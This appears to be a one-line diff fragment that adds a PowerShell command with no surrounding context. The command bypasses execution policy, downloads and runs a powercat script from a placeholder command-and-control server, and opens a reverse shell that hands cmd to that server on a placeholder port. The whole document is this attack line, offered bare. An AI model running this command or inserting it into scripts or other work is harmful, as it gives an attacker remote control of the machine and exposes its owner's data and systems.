@@ -1,0 +1,1 @@
+ powershell -exec bypass -c "iwr('http://XX_CC_SERVER_IP/powercat.ps1')|iex;powercat -c XX_CC_SERVER_IP -p XX_PORT -e cmd"
